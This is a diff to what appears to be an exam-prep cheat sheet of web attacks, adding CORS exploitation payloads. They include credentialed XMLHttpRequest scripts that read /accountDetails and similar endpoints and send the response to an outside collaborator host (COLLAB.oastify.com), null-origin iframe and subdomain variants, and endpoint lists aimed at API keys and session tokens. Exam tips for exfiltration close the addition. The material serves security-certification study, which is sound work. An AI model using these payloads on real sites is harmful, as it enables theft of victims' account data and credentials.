@@ -121,6 +121,56 @@ X-Forwarded-Scheme: nothttps
 
 ## CORS Attacks
 
+### CORS Account Details Exfiltration
+**Context:** CORS misconfiguration allows reading sensitive endpoints with credentials
+
+```html
+<script>
+var req = new XMLHttpRequest();
+
+req.onload = sendAPI;
+req.withCredentials = true;
+req.open('GET','https://TARGET/accountDetails',true);
+req.send();
+
+function sendAPI(){
+  location='https://COLLAB.oastify.com?api='+btoa(req.responseText);
+};
+</script>
+```
+
+**How it works:**
+1. `XMLHttpRequest` makes request to `/accountDetails`
+2. `withCredentials: true` sends victim's cookies
+3. `onload` callback executes when response received
+4. `btoa()` base64-encodes the response
+5. Redirects to attacker server with encoded data
+6. Attacker decodes base64 to read account details
+
+**Common sensitive endpoints to try:**
+- `/accountDetails` - Account information, API keys
+- `/my-account` - User profile, email, settings
+- `/api/user` - User data, session info
+- `/api/keys` - API keys, tokens
+- `/admin/users` - Admin panel data
+- `/settings` - Configuration, secrets
+- `/profile` - Personal information
+- `/api/session` - Session details
+
+**Why these endpoints matter:**
+- May contain API keys for privilege escalation
+- Session tokens for account takeover
+- Email addresses for further attacks
+- Admin credentials or secrets
+- Internal system information
+
+**Decode exfiltrated data:**
+```javascript
+atob('base64_encoded_data')
+```
+
+---
+
 ### CORS with Null Origin
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
@@ -131,10 +181,15 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='https://exploit-server.com/log?key='+this.responseText;
+    location='https://COLLAB.oastify.com/log?key='+this.responseText;
 };
 </script>"></iframe>
 ```
+
+**How it works:**
+- `sandbox` iframe has `null` origin
+- Some CORS configs allow `null` origin
+- Bypasses origin-based restrictions
 
 ---
 
@@ -147,9 +202,58 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='https://exploit-server.com/log?key='+encodeURIComponent(this.responseText);
+    location='https://COLLAB.oastify.com/log?key='+encodeURIComponent(this.responseText);
 };
 ```
+
+**Host on subdomain:**
+- `attacker.target.com` if CORS allows `*.target.com`
+- Bypasses same-origin restrictions
+
+---
+
+### CORS Endpoint Discovery
+
+**Test these endpoints for CORS misconfiguration:**
+```
+/accountDetails
+/my-account
+/api/user
+/api/keys
+/api/session
+/api/profile
+/admin/users
+/settings
+/config
+/api/admin
+```
+
+**Check for CORS headers:**
+```http
+GET /accountDetails HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+```
+
+**Look for response:**
+```http
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+```
+
+**If present:** Endpoint is vulnerable to CORS attack
+
+---
+
+### Exam Tips - CORS
+
+1. **Always check `/accountDetails`** - Most common vulnerable endpoint
+2. **Use base64 encoding** - `btoa()` for clean exfiltration
+3. **Try multiple endpoints** - `/api/user`, `/my-account`, `/settings`
+4. **Check for API keys** - Often in account details response
+5. **Use `withCredentials: true`** - Required to send cookies
+6. **Test null origin** - Use sandbox iframe
+7. **Look for session data** - May contain admin tokens
 
 ---
 
